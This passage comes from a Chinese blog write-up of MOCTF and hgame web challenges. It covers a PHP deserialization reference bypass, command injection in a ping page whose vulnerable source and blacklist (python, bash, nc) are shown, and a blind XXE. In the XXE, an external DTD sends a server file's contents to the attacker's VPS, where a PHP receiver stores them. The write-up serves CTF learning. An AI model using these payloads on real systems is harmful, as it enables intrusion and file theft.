target="_blank" rel="noopener" href="http://www.jb51.net/article/107101.htm">http://www.jb51.net/article/107101.htm</a>
然后注意flag.php里面有个 $this-&gt;flag == $this-&gt;name
那么可以用引用绕过 <span class="math inline">\(this-&gt;name =
&amp;\)</span>this-&gt;flag 然后序列化,代码如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MOCTF</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$temp</span> = <span class="keyword">new</span> <span class="title function_ invoke__">MOCTF</span>();</span><br><span class="line"><span class="variable">$temp</span> -&gt; name = &amp;<span class="variable">$temp</span>-&gt;flag;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$temp</span>));</span><br></pre></td></tr></table></figure>
<p>得到结果 <code>O:5:"MOCTF":2:&#123;s:4:"flag";N;s:4:"name";R:2;&#125;</code>
然后提交帐号为O:5:"MOCTF":2:{s:4:"flag";N;s:4:"name";R:2;}
密码随意,然后访问flag.php,拿到flag
<code>Wow,this is flag:moctf&#123;ser1ali2e_h4ndler_1s_c00l&#125;</code></p>
<h3 id="ping一下好吗">ping一下好吗</h3>
<p>命令执行的题目,一道题学到了不少东西 首先ceye.io了解一下
注册一个号,然后里面有攻击的payload 不知道为什么大神的方法不行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`lsbase64`.xxxx.ceye.io</span><br></pre></td></tr></table></figure>
<p>但是我就不行...
后来想了个办法,既然命令可以执行,那么我直接把得到的回显写到另外一个文件不就好了
所以我就</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`ls&gt;123.txt`.xxxx.ceye.io</span><br></pre></td></tr></table></figure>
<p>得到文件目录</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">123.txt</span><br><span class="line">apache2</span><br><span class="line">css</span><br><span class="line">exec.php</span><br><span class="line">fhnrwlnbjvf.php</span><br><span class="line">index.html</span><br></pre></td></tr></table></figure>
<p>然后再</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`cat fhnrwlnbjvf.php&gt;321.txt`.xxxx.ceye.io</span><br></pre></td></tr></table></figure>
<p>去访问一下321.txt</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$flag</span>=<span class="string">&quot;moctf&#123;dfa10ff1bd9872cda1d408f07eb66394&#125;&quot;</span>;</span><br></pre></td></tr></table></figure>
<p>本来打算用sed -n -p1来提取的,但是-被过滤了...很惨...
看完这道题还顺便理解了之前hctf的那道oob,不错不错
噢噢对了,把源码放一下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$target</span> = <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;ip&#x27;</span> ];</span><br><span class="line">    <span class="comment">// var_dump($target);</span></span><br><span class="line">    <span class="variable">$target</span>=<span class="title function_ invoke__">trim</span>(<span class="variable">$target</span>);</span><br><span class="line">    <span class="comment">// var_dump($target);</span></span><br><span class="line">    <span class="comment">// Set blacklist</span></span><br><span class="line">    <span class="variable">$substitutions</span> = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;&amp;&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;;&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;-&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;python&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;bash&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;nc&#x27;</span> =&gt;<span class="string">&#x27;&#x27;</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Remove any of the charactars in the array (blacklist).</span></span><br><span class="line">    <span class="variable">$target</span> = <span class="title function_ invoke__">str_replace</span>( <span class="title function_ invoke__">array_keys</span>( <span class="variable">$substitutions</span> ), <span class="variable">$substitutions</span>, <span class="variable">$target</span> );</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$target</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="title function_ invoke__">stristr</span>( <span class="title function_ invoke__">php_uname</span>( <span class="string">&#x27;s&#x27;</span> ), <span class="string">&#x27;Windows NT&#x27;</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Windows</span></span><br><span class="line"></span><br><span class="line">        <span class="variable">$cmd</span> = <span class="title function_ invoke__">shell_exec</span>( <span class="string">&#x27;ping  &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// *nix</span></span><br><span class="line">        <span class="variable">$cmd</span> = <span class="title function_ invoke__">shell_exec</span>( <span class="string">&#x27;ping  -c 1 &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for the end user</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$cmd</span> != <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;exec success&quot;</span>.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$cmd</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="更新">2.22更新</h4>
<h3 id="字符串处理">字符串处理</h3>
<p>这道题啊...真是惨到爆炸,题目提示的是application/xml,然后client-ip=
localhost,
就很明显是xxe,但是我并不会,看了大佬的博客之后,自己试着写了一个blind
xxe的payload 但是从来都没有成功过,所以这篇文章拖到现在还没发...
虽然现在题目已经关掉了,但是还是把payload给发一下吧,虽然这个payload是hgame里的payload,不过自己修改一下xml文件就ok(其实叫dtd更好一点),这里给出hgame的**书店那道题的解法</p>
<h4 id="测试版">测试版:</h4>
<p>首先服务器上放一个evil.xml文件</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">payload</span> <span class="string">&quot;1111&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">int</span> <span class="string">&quot;&lt;!ENTITY &amp;#37; trick SYSTEM &#x27;http://你的vps/xxe.php?f=%payload;&#x27;&gt;&quot;</span>&gt;</span></span><br><span class="line">%int;</span><br><span class="line">%trick;</span><br></pre></td></tr></table></figure>
<p>然后 xxe.php的文件内容是</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;./1.txt&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>然后post的内容是</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> standalone=<span class="string">&quot;no&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">remote</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://你的vps/evil.xml&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%remote;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure>
<p>然后就可以在vps上收到数据,1.txt里面就是1111
如果把payload里的东西改成请求的话,那么就是把evil.xml改成</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">payload</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///a/b&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">int</span> <span class="string">&quot;&lt;!ENTITY &amp;#37; trick SYSTEM &#x27;http://你的vps/xxe.php?f=%payload;&#x27;&gt;&quot;</span>&gt;</span></span><br><span class="line">%int;</span><br><span class="line">%trick;</span><br></pre></td></tr></table></figure>
<p>这里就可以读取到服务器上的a/b的文件并存到你vps上当前目录的1.txt下
然后就拿到flag: hgame{Xxe_v3ry_funny!!!!}</p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/about/">About</a></li>
        
          <li><a href="/archives/">Writing</a></li>
        
          <li><a href="/categories/">Category</a></li>
        
          <li><a href="/search/">Search</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%98%AF%E6%97%B6%E5%80%99%E8%AE%A9%E4%BD%A0%E6%89%8B%E6%8C%87%E9%94%BB%E7%82%BC%E4%B8%80%E4%B8%8B%E4%BA%86"><span class="toc-number">1.</span> <span class="toc-text">是时候让你手指锻炼一下了</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ez-injection"><span class="toc-number">2.</span> <span class="toc-text">ez Injection</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A6%81%E8%AE%A4%E7%9C%9F"><span class="toc-number">3.</span> <span class="toc-text">要认真</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pubg"><span class="toc-number">4.</span> <span class="toc-text">PUBG</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%99%BB%E5%BD%95%E4%B8%80%E5%93%88"><span class="toc-number">5.</span> <span class="toc-text">登录一哈</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ping%E4%B8%80%E4%B8%8B%E5%A5%BD%E5%90%97"><span class="toc-number">6.</span> <span class="toc-text">ping一下好吗</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9B%B4%E6%96%B0"><span class="toc-number">6.1.</span> <span class="toc-text">2.22更新</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%A4%84%E7%90%86"><span class="toc-number">7.</span> <span class="toc-text">字符串处理</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95%E7%89%88"><span class="toc-number">7.1.</span> <span class="toc-text">测试版:</span></a></li></ol></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2018/02/22/moctf%E5%AD%A6%E4%B9%A0/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2018/02/22/moctf%E5%AD%A6%E4%B9%A0/&text=moctf学习"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2018/02/22/moctf%E5%AD%A6%E4%B9%A0/&title=moctf学习"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2018/02/22/moctf%E5%AD%A6%E4%B9%A0/&is_video=false&description=moctf学习"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=moctf学习&body=Check out this article: http://example.com/2018/02/22/moctf%E5%AD%A6%E4%B9%A0/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2018/02/22/moctf%E5%AD%A6%E4%B9%A0/&title=moctf学习"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2018/02/22/moctf%E5%AD%A6%E4%B9%A0/&title=moctf学习"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2018/02/22/moctf%E5%AD%A6%E4%B9%A0/&title=moctf学习"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2018/02/22/moctf%E5%AD%A6%E4%B9%A0/&title=moctf学习"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2018/02/22/moctf%E5%AD%A6%E4%B9%A0/&name=moctf学习&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2018/02/22/moctf%E5%AD%A6%E4%B9%A0/&t=moctf学习"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2016-2025
    blacsheep
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/categories/">Category</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
